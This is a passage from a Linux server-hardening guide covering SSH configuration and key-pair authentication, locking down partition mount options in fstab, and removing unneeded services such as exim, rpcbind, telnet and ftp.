Now when you type `yes`, the fingerprint is added to your clients:  
`/home/you/.ssh/known_hosts` file,  
so that next time you try and login via SSH, your client will already know your server.

##### Hardening SSH

There are a bunch of things you can do to minimise SSH being used as an attack vector. Let us walk through some now.

After any changes, restart SSH daemon as root (using sudo) to apply the changes.

{linenos=off, lang=Bash}
    service ssh restart

You can check the status of the daemon with the following command:

{linenos=off, lang=Bash}
    service ssh status

**Configuring which hosts can access your server**

This can be done with a firewall, or at a lower level which I prefer. The two files you need to know about are: `/etc/hosts.deny` and `/etc/hosts.allow`. The names of the files explain what they contain. `hosts.deny` contains addresses of hosts which are blocked, `hosts.allow` contains addresses of hosts which are allowed to connect.

If you wanted to allow access to the SSH daemon from `1.1.1.x` and `10.0.0.5`, but no others, you would set-up the files like the following:

{title="/etc/hosts.allow", linenos=off, lang=Bash}
    sshd: 1.1.1.0/255.255.255.0   # Access to all 254 hosts on 1.1.1.0/24
    sshd: 10.0.0.5                # Just the single host.

{title="/etc/hosts.deny", linenos=off, lang=Bash}
    ALL: ALL

If you wanted to deny all only to SSH, so that users not listed in `hosts.allow` could potentially log into other services. you would set the `hosts.deny` up like the following:

{title="/etc/hosts.deny", linenos=off, lang=Bash}
    sshd: ALL

There are also commented examples in the above files and check the man page for all of the details.

**Changes to the servers `/etc/ssh/sshd_config` file**

To tighten security up considerably Make the necessary changes to your servers:  
`/etc/ssh/sshd_config` file.  
Start with the changes I list here. When you change things like setting up `AllowUsers` or any other potential changes that could lock you out of the server. It is a good idea to be logged in via one shell when you exit another and test it. This way if you have locked yourself out, you will still be logged in on one shell to adjust the changes you have made. Unless you have a need for multiple users, you can lock it down to a single user. You can even lock it down to a single user from a specific host.

{title="/etc/ssh/sshd_config", linenos=off, lang=Bash}
    # If specified, login is allowed only for users that match one of the patterns.
    # Also consider DenyUsers, DenyGroups, AllowGroups.
    # Only allow kim, mydog, mycat, myrat to login.
    # Patterns like kim@10.0.0.5 are also allowed and would only allow kim to login from 10.0.0.5
    AllowUsers kim mydog mycat, myrat

    # Deny specific users you, and maninthemoon.
    DenyUsers you, maninthemoon

    # You really don't want root to be able to log in if at all possible.
    PermitRootLogin no

    # Change the LoginGraceTime (seconds) to as small as possible number.
    LoginGraceTime 30

    # Set PasswordAuthentication to no once you get key pair auth set-up.
    PasswordAuthentication no
    PubkeyAuthentication yes

    PermitEmptyPasswords no

    # Consider using a non default port below 1025 that only root can bind to
    # in order to stop the sshd being swapped. This actually stops a lot of
    # noise if your web server is open to the internet, as many automated scanns target port 22.
    Port 202

As you can see, these changes are very simple, but so many do not do it. Every positive security change you make to the low hanging fruit lifts it that little bit higher for the attacker to reach, making it less economical for them.

You can also consider installing and configuring [denyhosts](https://www.digitalocean.com/community/articles/how-to-install-denyhosts-on-ubuntu-12-04)

Check SSH login attempts. As root or via sudo, type the following to see all failed login attempts:

{linenos=off, lang=Bash}
    cat /var/log/auth.log | grep 'sshd.*Invalid'
    # Or list the bad login attempts from /var/log/btmp unless modified by an attacker.
    lastb -ad

If you want to see successful logins, enter the following:

{linenos=off, lang=Bash}
    cat /var/log/auth.log | grep 'sshd.*opened'
    # Or list the last logged in users from /var/log/wtmp unless modified by an attacker.
    last -ad

If you are sending your logs off-site in real-time, it will not matter to much if the attacker tries to cover their tracks by modifying these types of files. If you are checking the integrity of your system files frequently with one of the Host Intrusion Detection Systems ([HIDS](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids)) we discuss a little further on in this chapter, then you will know you are under attack and will be able to take measures quickly, providing you have someone engaged watching out for these attacks, as discussed in the People chapter of Fascicle 0. If your HIDS is on the same machine that is under attack, then it is quite likely that any decent attacker is going to find it before they start modifying files and some-how render it ineffective. That is where [Stealth](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-deeper-with-stealth) shines, as it is so much harder to find where it is operating from, if the attacker even knows it is.

{#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-key-pair-authentication}
**Key-pair Authentication**

The details around how the client authenticates to the server are above in part 2 of the [SSH Connection Procedure](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-ssh-connection-procedure) section. This section shows you how to set-up key-pair authentication, as opposed to password authentication.

Make sure you use a long pass-phrase (this is your second factor of authentication) for your key-pair, that you store in a password vault with all your other passwords. You are using a decent password vault right? If your pass-phrase and private key is compromised, your hardening effort will be softened or compromised.

My feeling after a lot of reading is that currently RSA with large keys (The default RSA size is 2048 bits) is a good option for key-pair authentication. Personally I like to go for 4096 these days.

Create your key-pair if you have not already and set-up key-pair authentication. Key-pair auth is more secure and allows you to log in without a password. Your pass-phrase should be stored in your keyring. You will just need to provide your local password once (each time you log into your local machine) when the keyring prompts for it.

On your client machine that you want to create the key-pair and store them:

{linenos=off, lang=Bash}
    ssh-keygen -t rsa -b 4096
    
Agree to the location that `ssh-keygen` wants to store the keys... `/home/you/.ssh`

Enter a pass phrase twice to confirm. Keys are now in `/home/you/.ssh`

Optionally, the new private key can be added to `id_rsa.keystore` if it hasn't been already:

{linenos=off, lang=Bash}
    ssh-add id_rsa

Then enter your pass-phrase.

Now we need to get the public key we have just created (`~/.ssh/id_rsa.pub`) from our client machine into our servers `~/.ssh/` directory.  
You can `scp` it, but this means also logging into the server and creating the:  
`~/.ssh/authorized_keys` file if it does not already exist,  
and appending (`>>`) the contents of id_rsa.pub to `~/.ssh/authorized_keys`. There is an easier way, and it goes like this, from your client machine:

{linenos=off, lang=Bash}
    ssh-copy-id "you@your_server -p [your non default port]"

This will copy the public key straight into the `~/.ssh/authorized_keys` file on your_server. You may be prompted to type `yes` if it is the first time you have connected to the server, that the authenticity of the server you are trying to connect to can not be established and you want to continue. Remember I mentioned this above in the [Establishing your SSH Servers Key Fingerprint](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-establishing-your-ssh-servers-key-fingerprint) section? Make sure you check the servers Key Fingerprint and do not just blindly accept it, this is where our security solutions break down... due to human defects.

Also make sure the following permissions and ownership on the server are correct:

{#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-key-pair-authentication-ssh-perms}
{linenos=off, lang=Bash}
    chmod go-w ~/
    # Everything in the ~/.ssh dir needs to be chmod 600
    chmod -R 600 ~/.ssh
    # Make sure you are the owner of authorized_keys also.
    chown [you] authorized_keys

##### Tunneling SSH {#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-tunneling-ssh}

You may need to tunnel SSH once the server is placed into the DMZ. Usually this will be mostly set-up on your router. If you are on the outside of your network, you will just SSH to your external IP address.

{linenos=off, lang=Bash}
    # The -A option is useful for hopping from your network internal server to other servers.
    ssh your_webserver_account@your_routers_wan_interface -A -p [router wan non default port] 

If you are wanting to SSH from your LAN host to your DMZ web server:

{linenos=off, lang=Bash}
    ssh your_webserver_account@your_routers_lan_interface -p [router wan non default port] 

Before you try that though, you will need to set-up the port forwards and add the WAN and/or LAN rule to your router. How you do this will depend on what you are using for a router.

I have blogged extensively over the years on SSH. The Additional Resources chapter has links to my resources for a plethora of information on configuring and using SSH in many different ways.

**sshuttle**

I just thought I would throw sshuttle in here as well, it has nothing to do with hardening SSH, but it is a very useful tool for tunneling SSH. Think of it as a poor mans VPN, but it does some things better than the likes of OpenVPN, like forcing DNS queries through the tunnel also. It is very simple to run.

{linenos=off, lang=Bash}
    # --dns: capture and forward local DNS requests
    # -v: verbosity, -r: remote
    # 0/0: forwards all local traffic over the SSH channel.
    sshuttle --dns -vvr your_shell_account@your_ssh_shell 0/0
    # That is it, now all comms go over your SSH tunnel. So simple. Actually easier than a VPN

As opposed to manually specifying socks and then having to tell your browser to proxy through `localhost` and use the same port you defined after the socks (`-D`) option, and then having to do the same for any other programmes that want to use the same tunnel:
   
{linenos=off, lang=Bash}
    ssh -D [any spare port] your_shell_account@your_ssh_shell
    # Now go set-up proxies for all consumers. What a pain!
    # On top of that, DNS queries are not forced through the tunnel,
    # So censorship can still bite you.

Dnscrypt can help conceal DNS queries, but that would be more work. Another offering I've used is the [bitmask](https://bitmask.net/) VPN [client](https://dl.bitmask.net/linux/) which does a lot more than traditional VPN clients, bitmask starts an egress firewall that rewrites all DNS packets to use the VPN. bitmask is sponsored by the [LEAP Encryption Access Project](https://leap.se/) and looks very good, I've used this, and the chaps on the #riseup IRC channel on the indymedia server are really helpful to. Bitmask is working on Debian, Ubuntu, and Mint 17, but not so well on Mint 18 when I tried it, but this will probably change.

#### Disable Boot Options
![](images/ThreatTags/PreventionVERYEASY.png)

All the major hypervisors should provide a way to disable all boot options other than the device you will be booting from. VMware allows you to do this in vSphere Client.

While you are at it, [set](http://kb.vmware.com/selfservice/microsites/search.do?language=en_US&cmd=displayKC&externalId=1004129) a BIOS password.

#### Lock Down the Mounting of Partitions {#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions}

**File Permission and Ownership Level**

Addressing the [first risk](#vps-identify-risks-unnecessary-and--vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation-mitigations) as discussed in the "[Overly Permissive File Permissions, Ownership and Lack of Segmentation](#vps-identify-risks-unnecessary-and--vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation)" section of the Identify Risks section:

The first thing to do is locate the files with overly permissive permissions and ownership. Running the suggested tools is a good place to start. From there, following your nose to find any others is a good idea. Then tighten them up so that they conform to the least amount of privilege and ownership necessary in order for the legitimate services/activities to run. Also consider removing any `suid` bits on executables `chmod u-s <yourfile>`. We also address applying `nosuid` to our mounted file systems below which provide a nice safety net.

**Mount Point of the File Systems**

Addressing the [second risk](#vps-identify-risks-unnecessary-and--vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation-mitigations) as discussed in the "[Overly Permissive File Permissions, Ownership and Lack of Segmentation](#vps-identify-risks-unnecessary-and--vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation)" section of the Identify Risks section:

Let us get started with your `fstab`.

Make a backup of your `/etc/fstab` file before you make changes, this is really important, it is often really useful to just swap the modified `fstab` with the original as you are progressing through your modifications. Read the man page for fstab and also the options section in the mount man page. The Linux File System Hierarchy ([FSH](http://www.tldp.org/LDP/Linux-Filesystem-Hierarchy/html/index.html)) documentation is worth consulting also for directory usages. The following was my work-flow:

Before you modify and remount `/tmp`, view what its currently mounted options look like with:

{linenos=off, lang=Bash}
    mount | grep ' /tmp'

Add the `noexec` mount option to `/tmp` but not `/var` because executable shell scripts such as `*pre[inst, rm]` and `*post[inst, rm]` reside within `/var/lib/dpkg/info`. You can also add the `nodev,nosuid` options to `/tmp`.

So you should have the following line in `/etc/fstab` now looking like this:

{title="/etc/fstab", linenos=off, lang=Bash}
    UUID=<block device ID goes here> /tmp ext4 defaults,noexec,nodev,nosuid 0 2

Then to apply the new options from `/etc/fstab`:

{linenos=off, lang=Bash}
    sudo mount -o remount /tmp

Then by issuing the `sudo mount | grep ' /tmp'` command again, you'll see your new options applied.

You can add the `nodev` option to `/home`, `/opt`, `/usr` and `/var` also. You can also add the `nosuid` option to `/home`. You can add `ro` to `/usr`

So you should have the following lines, as well as the above `/tmp` in `/etc/fstab` now looking like this:

{title="/etc/fstab", linenos=off, lang=Bash}
    UUID=<block device ID goes here> /home ext4 defaults,nodev,nosuid 0 2
    UUID=<block device ID goes here> /opt ext4 defaults,nodev 0 2
    UUID=<block device ID goes here> /usr ext4 defaults,nodev,ro 0 2
    UUID=<block device ID goes here> /var ext4 defaults,nodev 0 2

Before you remount the above changes, you can view the options for the current mounts:

{linenos=off, lang=Bash}
    mount

Then remount the mounts you have just specified in your `fstab` above:

{linenos=off, lang=Bash}
    sudo mount -o remount /home
    sudo mount -o remount /opt
    sudo mount -o remount /usr
    sudo mount -o remount /var

Now have a look at the changed options applied to your mounts:

{linenos=off, lang=Bash}
    mount

You can now bind some target [mounts onto existing directories](http://www.cyberciti.biz/faq/linux-add-nodev-nosuid-noexec-options-to-temporary-storage-partitions/). I had only limited success with this technique, so keep reading. The lines to add to the `/etc/fstab` are as per the following. The file system type should be specified as `none` (as stated in the “The bind mounts” section of the [mount](http://man.he.net/man8/mount) man page. The `bind` option binds the mount. There was a bug with the suidperl package in Debian where setting `nosuid` created an insecurity. suidperl is no longer available in Debian:

{title="/etc/fstab", linenos=off, lang=Bash}
    /var/tmp /var/tmp none rw,noexec,nosuid,nodev,bind 0 2
    /var/log /var/log none rw,noexec,nosuid,nodev,bind 0 2
    /usr/share /usr/share none nodev,nosuid,bind 0 2

Before you remount the above changes, you can view the options for the current mounts:

{linenos=off, lang=Bash}
    mount

Then remount the above immediately, thus taking effect before a reboot, which is the safest way, as if you get the mounts incorrect, your system may fail to boot in some cases, which means you will have to boot a live CD to modify the `/etc/fstab`, execute the following commands:

{linenos=off, lang=Bash}
    sudo mount --bind /var/tmp /var/tmp
    sudo mount --bind /var/log /var/log

Then to pick up the new options from `/etc/fstab`:

{linenos=off, lang=Bash}
    sudo mount -o remount /var/tmp
    sudo mount -o remount /var/log
    sudo mount -o remount /usr/share

Now have a look at the changed options applied to your mounts:

For further details consult the remount option of the mount man page.

At any point you can check the options that you have your directories mounted as, by issuing the following command:

{linenos=off, lang=Bash}
    mount

&nbsp;

As mentioned above, I had some troubles adding these mounts to existing directories, I was not able to get all options applied, so I decided to take another backup of the VM (I would highly advise you to do the same if you are following along) and run the machine from a live CD (Knoppix in my case). I Ran Disk Usage Analyzer to work out which sub directories of `/var` and `/usr` were using how much disk space, to work out how much to reduce the sizes of partitions that `/var` and `/usr` were mounted on, in order to provide that space to sub directories (`/var/tmp`, `/var/log` and `/usr/share`) on new partitions.  
Run gparted and unmount the relevant directory from its partition (`/var` from `/dev/sda5`, and `/usr` from `/dev/sda8` in this case). Reduce the size of the partitions, by the size of the new partitions you want taken from it. Locate the unallocated partition of the size that you just reduced the partition you were working on, and select new from the context menu. Set the File system type to `ext4` and click Add -> Apply All Operations -> Apply. You should now have the new partition.

Now you will need to mount the original partition that you resized and the new partition. Open a terminal with an extra tab. In the left terminal go to where you mounted the original partition (`/media/sda5/tmp/` for example), in the right terminal go to where you mounted the new partition (`/media/sda11/` for example).

Copy all in current directory of left terminal recursively, preserving all attributes other than hard links.

{linenos=off, lang=Bash}
    # -a (archive), -v (verbose), -z (compress)
    /media/sda5/share# rsync -avz * /media/sda11/

Once you have confirmed the copy, delete all in `/media/sda5/tmp/`

Back in gparted, mount `/dev/sda1` so we can modify the `/etc/fstab`. By running the `blkid` command you will be given the UUID for the partition to use in the `/etc/fstab`. Modify the `/media/sda1/etc/fstab` to look similar to the below sample `fstab`. Do the same for `/var/log` and `/usr/share`.

{title="/etc/fstab", linenos=off, lang=Bash}
    # /etc/fstab: static file system information.
    #
    # Use 'blkid' to print the universally unique identifier for a
    # device; this may be used with UUID= as a more robust way to name devices
    # that works even if disks are added and removed. See fstab(5).
    #
    # <file system> <mount point> <type> <options> <dump> <pass>
    # / was on /dev/sda1 during installation
    UUID=<block device ID goes here> / ext4 errors=remount-ro 0       1
    # /home was on /dev/sda9 during installation
    UUID=<block device ID goes here> /home ext4 defaults,nodev,nosuid 0 2
    # /opt was on /dev/sda7 during installation
    UUID=<block device ID goes here> /opt ext4 defaults,nodev 0 2
    # /tmp was on /dev/sda6 during installation
    UUID=<block device ID goes here> /tmp ext4 defaults,noexec,nodev,nosuid 0 2
    # /usr was on /dev/sda8 during installation
    UUID=<block device ID goes here> /usr ext4 defaults,nodev,ro 0 2
    # /var was on /dev/sda5 during installation
    UUID=<block device ID goes here> /var ext4 defaults,nodev 0 2
    
    # 2016-08-29 Using GParted in Knopix, I reduced the size of /var (on sda5) by 300MB
    # Ceated new partition (sda11) of 100MB for existing /var/tmp.
    # Created new partition (sda12) of 200MB for existing /var/log.
    # With the help of df -h, lsblk, and blkid, I created the following two mounts:
    UUID=<block device ID goes here> /var/tmp ext4 rw,noexec,nosuid,nodev 0 2
    UUID=<block device ID goes here> /var/log ext4 rw,noexec,nosuid,nodev 0 2
    # Then did the same thing with /usr (on sda8)
    UUID=<block device ID goes here> /usr/share ext4 nosuid,nodev,ro 0 2
    
    # Added tmpfs manually.
    tmpfs /dev/shm tmpfs defaults,nodev,nosuid,noexec 0 0
    
    # swap was on /dev/sda10 during installation
    UUID=<block device ID goes here> none swap sw 0 0
    /dev/sr0 /media/cdrom0 udf,iso9660 user,noauto 0 0
    /dev/fd0 /media/floppy0 auto rw,user,noauto 0 0

If you added any of these mounts on the machine while it was running, you could use the following command to mount them all.

{linenos=off, lang=Bash}
    sudo mount -a

Once you have booted into your machine again, you can perform some tests. 

{linenos=off, lang=Bash}
    mount
    # Relevant output lines:
    tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev,noexec)
    /dev/sda11 on /var/tmp type ext4 (rw,nosuid,nodev,noexec,relatime,data=ordered)
    /dev/sda12 on /var/log type ext4 (rw,nosuid,nodev,noexec,relatime,data=ordered)
    /dev/sda13 on /usr/share type ext4 (ro,nosuid,nodev,relatime,data=ordered)

Test your `noexec` by putting the following script in `/var`, and changing the permissions on it:

{linenos=off, lang=Bash}
    # Make sure execute bits are on.
    sudo chmod 755 /var/kimsTest

Copying it to `/var/tmp`, and `/var/log`, Then try running each of them. You should only be able to run the one that is in the directory mounted without the `noexec` option. My file “kimsTest” looks like this:

{title="kimsTest", linenos=off, lang=Bash}
    #!/bin/sh
    echo "Testing testing testing kim"

Try running them:

{linenos=off, lang=Bash}
    you@your_server:/var$ ./kimsTest
    Testing testing testing kim
    you@your_server:/var$ ./tmp/kimsTest
    -bash: ./tmp/kimsTest: Permission denied
    you@your_server:/var$ ./log/kimsTest
    -bash: ./tmp/kimsTest: Permission denied

If you set `/tmp` with `noexec` and / or `/usr` with read-only (`ro`), then you will also need to modify or create if it does not exist, the file `/etc/apt/apt.conf` and also the referenced directory that apt will write to. The file could look something like the following:

{title="/etc/apt/apt.conf", linenos=off, lang=Bash}
    # IP is the address of your apt-cacher server
    # Port is the port that your apt-cacher is listening on, usually 3142
    Acquire::http::Proxy “http://[IP]:[Port]”;

    # http://www.debian.org/doc/manuals/securing-debian-howto/ch4.en.html#s4.10.1
    # Set an alternative temp directory to /tmp if /tmp in /etc/fstab is noexec,
    # and make sure the directory exists.
    # See following link for An alternative technique:
    # https://debian-administration.org/article/57/Making_/tmp_non-executable
    APT::ExtractTemplates::TempDir "/etc/apt/packagefiles";
    
    # If /usr in /etc/fstab is set to read-only (ro),
    # you will have to first set /usr to read-write (rw) in order to
    # install new packages, then remount according to /etc/fstab.
    # Another example here: https://frouin.me/2015/03/16/tmp-no-exec/
    DPkg
    {
       Pre-Invoke
       {  
          "mount -o remount,rw /usr";
          "mount -o remount,rw /usr/share";
       };
       Post-Invoke
       {
          "mount -o remount /usr";
          "mount -o remount /usr/share";
       };
    };

You can spend quite a bit of time experimenting with your mounts and testing. It is well worth locking these down as tightly as you can, make sure you test properly before you reboot, unless you are happy modifying things further via a live CD. This set-up will almost certainly not be perfect for you, there are many options you can apply, some may work for you, some may not. Be prepared to keep adjusting these as time goes on, you will probably find that something can not execute where it is supposed to, or some other option you have applied is causing some trouble. In which case you may have to relax some options, or consider tightening them up more. Good security is always an iterative approach. You can not know today, what you are about to learn tomorrow. 

You can also look at enabling a [read-only `/` mount](https://wiki.debian.org/ReadonlyRoot#Enable_readonly_root)

Also consider the pros and cons of [increasing](http://www.cyberciti.biz/tips/what-is-devshm-and-its-practical-usage.html) your shared memory (via `/run/shm`) vs not increasing it.

Check out the [Additional Resources](#additional-resources-vps-locking-down-the-mounting-of-partitions) chapter for extra resources in working with your mounts.

#### Portmap {#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-rpc-portmapper}

{linenos=off, lang=Bash}
    dpkg-query -l '*portmap*'
    dpkg-query: no packages found matching *portmap*

If port mapper is not installed (default on debian web server), we do not need to remove it. Recent versions of Debian will use the `portmap` replacement of `rpcbind` instead. If you find port mapper is installed, you do not need it on a web server, and if you are hardening a file server, you may require `rpcbind`. For example there are two packages required if you want to support NFS on your server: nfs-kernel-server and nfs-common, the latter has a [dependency on `rpcbind`](https://packages.debian.org/stretch/nfs-common).

The `portmap` service (version 2 of the port mapper protocol) would [convert](http://www.linux-nis.org/nis-howto/HOWTO/portmapper.html) RPC program numbers into TCP/IP (or UDP/IP) protocol port numbers. When an RPC server (such as NFS prior to v4) was started, it would instruct the port mapper which port number it was listening on, and which RPC program numbers it is prepared to serve. When clients wanted to make an RPC call to a given program number, the client would first contact the `portmap` service on the server to enquire of which port number its RPC packets should be sent. [`Rpcbind`](#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-rpcbind) which uses version 3 and 4 of the port mapper protocol (called the rpcbind protocol) does things a little differently.

You can also stop `portmap` responses by modifying the two below hosts files like so: 

{title="/etc/hosts.allow", linenos=off, lang=Bash}
    # All : ALL

{title="/etc/hosts.deny", linenos=off, lang=Bash}
    portmap : ALL

but ideally, if you do need the port mapper running, consider upgrading to `rpcbind` for starters, then check the [`rpcbind` section](#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-rpcbind) below for countermeasures, 

The above changes to the two hosts files would be effective immediately. A restart of the port mapper is not required in this case.

There are further details around the `/etc/hosts.[deny & allow]` in the [NFS section](#vps-countermeasures-disable-remove-services-harden-what-is-left-nfs)

#### Disable, Remove Exim {#vps-countermeasures-disable-remove-services-harden-what-is-left-disable-exim}

{linenos=off, lang=Bash}
    dpkg-query -l '*exim*'

This will probably show that Exim4 is currently installed.

If so, before exim4 is disabled, a `netstat -tlpn` will produce output similar to the following:

![](images/NetstatBeforeEximDisabled.png)

Which shows that exim4 is listening on localhost and it is not publicly accessible. Nmap confirms this, but we do not need it, so lets disable it. You could also use the more modern ss program too. You may also notice `monit` and `nodejs` listening in these results. Both [`monit`](#vps-countermeasures-lack-of-visibility-proactive-monitoring-getting-started-with-monit) and our [`nodejs`](#vps-countermeasures-lack-of-visibility-proactive-monitoring-keep-nodejs-application-alive) application is set-up under the Proactive Monitoring section later in this chapter.

When a [run level](https://www.debian-administration.org/article/212/An_introduction_to_run-levels) is entered, `init` executes the target files that start with `K`, with a single argument of stop, followed with the files that start with `S` with a single argument of start. So by renaming `/etc/rc2.d/S15exim4` to `/etc/rc2.d/K15exim4` you are causing `init` to run the service with the stop argument when it moves to run level 2. Just out of interest sake, the scripts at the end of the links with the lower numbers are executed before scripts at the end of links with the higher two digit numbers. Now go ahead and check the directories for run levels 3-5 as well, and do the same. You will notice that all the links in `/etc/rc0.d/` (which are the links executed on system halt) start with `K`. Is it making sense?

Follow up with another `sudo netstat -tlpn`:

![](images/NetstatAfterEximDisabled.png)

And that is all we should see. If you don't have monit or node running, you won't see them either of course.

Later on I started receiving errors from `apt-get update && upgrade`:

{linenos=off, lang=Bash}
    Setting up exim4-config (4.86.2-1) ...
    2016-03-13 12:15:50 Exim configuration error in line 186 of /var/lib/exim4/config.autogenerated.tmp:
    main option "add_environment" unknown
    Invalid new configfile /var/lib/exim4/config.autogenerated.tmp, not installing 
    /var/lib/exim4/config.autogenerated.tmp to /var/lib/exim4/config.autogenerated
    dpkg: error processing package exim4-config (--configure):
    subprocess installed post-installation script returned error exit status 1
    Errors were encountered while processing: exim4-config

Removing the following packages will solve that:

{linenos=off, lang=Bash}
    apt-get --purge remove exim4 exim4-base exim4-config exim4-daemon-light
    # Get rid of the logs if you like.
    rm -r /var/log/exim4/

#### Remove NIS

If Network Information Service (NIS) or the replacement NIS+ is installed, ideally you will want to remove it. If you needed centralised authentication for multiple machines, you could set-up an LDAP server and configure PAM on your machines in order to contact the LDAP server for user authentication. We may have no need for distributed authentication on our web server at this stage.

Check to see if NIS is installed by running the following command:

{linenos=off, lang=Bash}
    dpkg-query -l '*nis*'

Nis is not installed by default on a Debian web server, so in this case, we do not need to remove it.

If the host you were hardening had the role of a file server and was running NFS, and you need directory services, then you may need something like Kerberos and/or LDAP. There is plenty of documentation and tutorials on Kerberos and LDAP and replacing NIS with them.

#### Rpcbind {#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-rpcbind}

One of the [differences](https://www.ibm.com/support/knowledgecenter/SSLTBW_2.2.0/com.ibm.zos.v2r2.halx001/portmap.htm) between the now deprecated [`portmap`](#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-rpc-portmapper) service and `rpcbind` is that `portmap` returns port numbers of the server programs and rpcbind returns universal addresses. This contact detail is then used by the RPC client to know where to send its packets. In the case of a web server we have no need for this.

Spin up Nmap:

{linenos=off, lang=Bash}
    nmap -p 0-65535 <your_server>

![](images/RemoveRpcBind.png)

Because I was using a non default port for SSH, nmap does not announce it correctly, although as shown in the Process and Practises chapter in the Penetration Testing section of Fascicle 0, using service fingerprinting techniques, it is usually easy to find out what is bound to the port. Tools like [Unhide](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-unhide) will also show you hidden processes bound to hidden ports.

To obtain a list of currently running servers (determined by `LISTEN`) on our web server.

{linenos=off, lang=Bash}
    sudo netstat -tap | grep LISTEN

or

{linenos=off, lang=Bash}
    sudo netstat -tlpn

As per the previous netstat outputs, we see that `sunrpc` is listening on a port and was started by `rpcbind` with the PID of `1498`. Now Sun Remote Procedure Call is running on port `111` (The same port that `portmap` used to listen on). Netstat can tell you the port, but we have confirmed it with the nmap scan above. Rpcbind is used by NFS (as mentioned above, `rpcbind` is a dependency of nfs-common) and as we do not need or want our web server to be a NFS file server, we can get rid of the `rpcbind` package. If for what ever reason you do actually need the port mapper, then make sure you lock down which hosts/networks it will respond to by modifying the `/etc/hosts.deny` and `/etc/hosts.allow` as seen in the [NFS section](#vps-countermeasures-disable-remove-services-harden-what-is-left-nfs).

{linenos=off, lang=Bash}
    dpkg-query -l '*rpc*'

Shows us that `rpcbind` is installed and gives us other details. Now if you have been following along with me and have made the `/usr` mount read only, some stuff will be left behind when we try to purge:

{linenos=off, lang=Bash}
    sudo apt-get purge rpcbind

Following are the outputs of interest. Now if you have your mounts set-up correctly, you will not see the following errors, if how ever you do see them, then you will need to spend some more time modifying your `/etc/fstab` as discussed above:

{linenos=off, lang=Bash}
    The following packages will be REMOVED:
    nfs-common* rpcbind*
    0 upgraded, 0 newly installed, 2 to remove and 0 not upgraded.
    Do you want to continue [Y/n]? y
    Removing nfs-common ...
    [ ok ] Stopping NFS common utilities: idmapd statd.
    dpkg: error processing nfs-common (--purge):
    cannot remove `/usr/share/man/man8/rpc.idmapd.8.gz': Read-only file system
    Removing rpcbind ...
    [ ok ] Stopping rpcbind daemon....
    dpkg: error processing rpcbind (--purge):
    cannot remove `/usr/share/doc/rpcbind/changelog.gz': Read-only file system
    Errors were encountered while processing:
    nfs-common
    rpcbind
    E: Sub-process /usr/bin/dpkg returned an error code (1)

If you received the above errors, ran the following command again:

{linenos=off, lang=Bash}
    dpkg-query -l '*rpc*'

Which would yield a result of `pH`, that is a desired action of (p)urge and a package status of (H)alf-installed, and want to continue the removal of `rpcbind`, try the `purge`, `dpkg-query` and `netstat` command again to make sure `rpcbind` is gone and of course no longer listening.

Also you can remove unused dependencies now, after you get the following message:

{linenos=off, lang=Bash}
    The following packages were automatically installed and are no longer required:
    libevent-2.0-5 libgssglue1 libnfsidmap2 libtirpc1
    Use 'apt-get autoremove' to remove them.
    The following packages will be REMOVED:
    rpcbind*
 
 {linenos=off, lang=Bash}
    sudo apt-get -s autoremove

Because I want to simulate what is going to be removed because I am paranoid and have made stupid mistakes with autoremove years ago, and that pain has stuck with me ever since. I auto-removed a meta-package which depended on many other packages. A subsequent autoremove for packages that had a sole dependency on the meta-package meant they would be removed. Yes it was a painful experience. `/var/log/apt/history.log` has your recent apt history. I used this to piece back together my system.

Then follow up with the real thing… Just remove the `-s` and run it again. Just remember, the less packages your system has the less code there is for an attacker to exploit.

The port mapper should never be visible from a hostile network, especially the internet. The same goes for all RPC servers due to reflected and often amplified DoS attacks.

You can also stop `rpcbind` responses by modifying the two below hosts files like so: 

{title="/etc/hosts.allow", linenos=off, lang=Bash}
    # All : ALL

{title="/etc/hosts.deny", linenos=off, lang=Bash}
    rpcbind : ALL

The above changes to the two hosts files would be effective immediately. A restart of the port mapper would not be required in this case.

There are further details around the `/etc/hosts.[deny & allow]` files in the [NFS section](#vps-countermeasures-disable-remove-services-harden-what-is-left-nfs) that will help you fine tune which hosts and networks should be permitted to query and receive response from the port mapper. Be sure to check them out if you are going to retain the port mapper, so you do not become a victim of a reflected amplified DoS attack, and that you keep any RPC servers that you may need exposed to your internal clients. You can test this by running the same command that we did in the [Identify Risks](#vps-identify-risks-unnecessary-and-vulnerable-services-portmap-rpcinfo-t) section.

{title="rpcinfo", linenos=off, lang=bash}
    rpcinfo -T udp <target host> 

This time, with the two hosts files set-up as above, the results should look like the following:

{title="rpcinfo results", linenos=off, lang=bash}
    No remote programs registered.

You will notice in the response as recorded by Wireshark, that the length is now smaller than the request:

{title="wireshark results", linenos=off, lang=bash}
    Source      Destination Protocol Length Info
    <source IP> <dest IP>   Portmap  82     V3 DUMP Call (Reply In 76)
    <dest IP>   <source IP> Portmap  70     V3 DUMP Reply (Call In 75)

#### Remove Telnet {#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-telnet}

Do not use Telnet for your own systems, SSH was designed to replace Telnet.

{linenos=off, lang=Bash}
    dpkg-query -l '*telnet*'

Telnet installed?

{linenos=off, lang=Bash}
    sudo apt-get remove telnet

Telnet gone?

{linenos=off, lang=Bash}
    dpkg-query -l '*telnet*'

#### Remove FTP

We have got sftp and scp, why would we want ftp?

{linenos=off, lang=Bash}
    dpkg-query -l '*ftp*'

Ftp installed?

{linenos=off, lang=Bash}
    sudo apt-get remove ftp

Ftp gone?

{linenos=off, lang=Bash}
    dpkg-query -l '*ftp*'

#### NFS {#vps-countermeasures-disable-remove-services-harden-what-is-left-nfs}

